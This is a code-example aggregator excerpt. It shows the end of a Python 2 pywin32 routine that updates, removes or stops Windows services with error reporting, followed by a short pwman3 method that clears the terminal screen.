        print "Changing service configuration"
        try:
            ChangeServiceConfig(serviceClassString, serviceName, serviceDeps = serviceDeps, startType=startup, bRunInteractive=interactive, userName=userName,password=password, exeName=exeName, displayName = serviceDisplayName, perfMonIni=perfMonIni,perfMonDll=perfMonDll,exeArgs=exeArgs,description=description)
            if customOptionHandler:
                apply( customOptionHandler, (opts,) )
            print "Service updated"
        except win32service.error, (hr, fn, msg):
            print "Error changing service configuration: %s (%d)" % (msg,hr)
            err = hr

    elif arg=="remove":
        knownArg = 1
        print "Removing service %s" % (serviceName)
        try:
            RemoveService(serviceName)
            print "Service removed"
        except win32service.error, (hr, fn, msg):
            print "Error removing service: %s (%d)" % (msg,hr)
            err = hr
    elif arg=="stop":
        knownArg = 1
        print "Stopping service %s" % (serviceName)
        try:
            if waitSecs:
                StopServiceWithDeps(serviceName, waitSecs = waitSecs)
            else:
                StopService(serviceName)
        except win32service.error, (hr, fn, msg):
            print "Error stopping service: %s (%d)" % (msg,hr)
            err = hr
    if not knownArg:
        err = -1
        print "Unknown command - '%s'" % arg
        usage()
    return err

#
# Useful base class to build services from.
#
 
Example 58
From project pwman3, under directory pwman/ui, in source file baseui.py.
Score: 5
vote
vote
def do_cls(self, args):  # pragma: no cover
        """clear the screen"""
        os.system("clear")

     
}





